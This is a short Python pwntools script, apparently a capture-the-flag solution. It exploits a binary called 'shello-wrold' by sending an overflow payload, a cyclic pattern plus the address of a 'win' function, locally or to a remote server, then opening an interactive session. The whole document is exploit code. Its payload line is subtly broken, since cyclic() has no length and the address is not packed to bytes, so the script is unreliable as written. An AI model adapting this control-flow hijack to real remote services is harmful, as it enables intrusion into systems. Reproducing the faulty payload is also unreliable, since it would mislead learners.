#!/usr/bin/env python3

from pwn import *

elf = ELF("./shello-wrold")
libc = elf.libc

context.binary = elf

gdbscript='''
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

def main():
    r = conn()

    payload = cyclic() + elf.sym.win 
    r.sendline(payload) 
    r.interactive()


if __name__ == "__main__":
    main()

